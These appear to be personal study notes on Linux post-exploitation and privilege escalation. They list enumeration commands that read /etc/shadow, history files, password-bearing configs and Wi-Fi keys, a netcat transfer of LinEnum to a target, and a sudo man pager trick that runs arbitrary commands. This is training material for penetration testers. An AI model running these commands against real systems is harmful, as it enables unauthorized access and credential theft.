# Notes---Post-Exploitation
- First task is to gather additional information about the system, including users, permissions, installed applications, how software is configured, and other things about the system which will help us in our quest for root.
## Privilege Escalation
- Different types of information we will gather :
```bash
- System and Network Information
- User Information
- Privileged Access / Cleartext Credentials
- Services
- Jobs/Tasks
- Installed Software Version Information
```

#### System and Network Information
- Hostname --> command : `hostname`
- Kernel Version --> comamnd : `uname -a`
- Operating System :
```bash
Does our current OS have any known exploitable vulnerabilities?

cat /etc/issue
```
- IP address --> command : `ifconfig`
- Running Process --> command : `ps auxw`
- Network Routes:
```bash
Is our currently compromised machine routed to other networks? Can we use this information to pivot?

route -n
```
- DNS Server:
```bash
Can we obtain information from the DNS server? Active Directory Accounts, Zone Transfers, etc.

cat /etc/resolv.conf
```
- ARP cache:
```bash
Have other machines communicated with another target? Are the other machines accessible from the target?

arp -a
```
- Current Network Connections:
```bash
Are there any established connections from our machine to other machines and vice versa? Are the connections over encrypted or non-encrypted channels? Can we sniff the traffic of those connections?

netstat -auntp
```
#### User Information
- Current user permissions:
```bash
Can our current user access sensitive information/configuration details that belong to other users?

find / -user username
```
- UID and GID Information for all users:
```bash
How many users on the system? What groups do users belong to? Can we modify files belonging to users in other groups?


for user in $(cat /etc/passwd |cut -f1 -d":"); do id $user; done
```
- Last logged on users:
```bash
Who’s been on the system? From what systems? Can we pivot to those other systems using credentials we might already have?

last -a
```
- Root accounts:
```bash
How many UID 0 (root) accounts are on the system? Can we get credentials for any of them?

cat /etc/passwd |cut -f1,3,4 -d":" |grep "0:0" |cut -f1 -d":" |awk '{print $1}'
```
- Home Directories :
```bash
Do we have access to other users’ home directories? Is any of the information contained in those directories useful to us?

ls –als /home/*
```
#### Privileged Access / Cleartext Credentials
- Can the current user execute anything with elevated privileges? --> command = `sudo -l`
- Are there any setuid root (SUID) binaries on the system which may be vulnerable to privilege escalation?:
```bash
find / -perm -4000 -type f 2>/dev/null
```
- Can we read configuration files that might contain sensitive information, passwords, etc.?:
```bash
grep "password" /etc/*.conf 2> /dev/null
```
- Can we read the shadow file? If so, can we crack any of the hashes? --> `cat /etc/shadow`
- Can we list or read the contents of the /root directory? --> `ls -als /root`
- Can we read other users’ history files?:
```bash
find /* -name *.*history* -print 2>/dev/null
```
#### Services
- Which services are configured on the system and what ports are they opening?:
```bash
netstat -auntp
```
- Are service configuration files readable or modifiable by our current user?:
```bash
find /etc/init.d/ ! -uid 0 -type f 2>/dev/null |xargs ls -la
```
- Do the configuration files contain any information we can use to our advantage? (i.e.,credentials, etc.):
```bash
cat /etc/mysql/my.cnf
```
- Can we stop or start the service as our current user?:
```bash
service service_name start/stop
```
#### Jobs/Tasks
- What tasks or jobs is the system configured to run and at which times?:
```bash
cat /etc/crontab
ls -als /etc/cron.*
```
- Are there any custom jobs or tasks configured as root that world-writable?
```bash
find /etc/cron* -type f -perm - o+w -exec ls -l {} \;
```
####  Installed Software Version Information
- What software packages are installed on the system? --> `dpkg -l`
- What versions? Are the versions installed out-of-date and vulnerable to existing available exploits?:
```bash
dpkg –l
searchsploit "ttpd 2.2"
```
- LinEnum:
```bash
https://github.com/rebootuser/LinEnum
https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
```
- Transfer file by nc:
```bash
target machine : nc -nlvp 1234 > LinEnum.sh
my machine : nc -w 3 <target IP> 1234 < LinEnum.sh
```
- An important note about transferring files via `netcat` is that all traffic is unencrypted and may be detected by Intrusion Detection Systems or other anomalous traffic detection mechanisms implemented within an organization

### Cleartext Credentials in Configuration Files
-  `grep` command will search the /etc directory recursively (-r) for all .conf files containing the string "password" while sending errors to /dev/null:
```bash
grep -r password /etc/*.conf 2> /dev/null
```
- Find dotfiles files with "history" in their names (i.e., .bash_history):
```bash
find /* -name *.*history* -print 2> /dev/null
```
- Grep the apache access.log file for "user" and "pass" strings:
```bash
cat /var/log/apache/access.log |grep -E "^user|^pass"
```
- Dump cleartext Pre-Shared Wireless Keys from Network Manager:
```bash
cat /etc/NetworkManager/system-connections/* |grep -E "^id|^psk"
```
- As the www-data user to search for any PHP files or MySQL configuration files which might contain credentials to the database.
### SUID Binaries
- The reason that `ping` is configured as a SUID root binary, is that ping, by its very nature uses `raw sockets` to generate and receive ICMP packets and that activity requires root access.
- The `passwd` executable, responsible for enabling users to change their passwords, is also SUID root, due to the fact that it needs to write to the `/etc/passwd` and `/etc/shadow` files.
- SUID executable files on a Linux system:
```bash
find / -perm -4000 -type f 2>/dev/null

Executing 'find' on the root directory (/), looking for regular executable files (-type f) with the setuid permission (-perm -4000) set, and sending all errors (2) to /dev/null.
```
- The issue arises when we find a SUID root executable that takes some form of user input that isn’t properly checked or sanitized, which could result in a buffer overflow within that binary, resulting in our code (input) being executed as root.
- Another scenario could simply be a SUID root binary that just takes an argument as a command to execute, or takes an argument as a file to read, etc.
### Sudo Privileged Access
- A change is required in the `/etc/sudoers` configuration file.
-  `man` Arbitrary Command Execution via Pager Argument:
```bash
man -P "id" man
sudo man -P "cat /etc/shadow" man

The pager (-P) argument allows to run a command that we want
```
- Docker Sudo exploit:
```bash
https://github.com/pyperanger/dockerevil
```
### Restricted Shells

























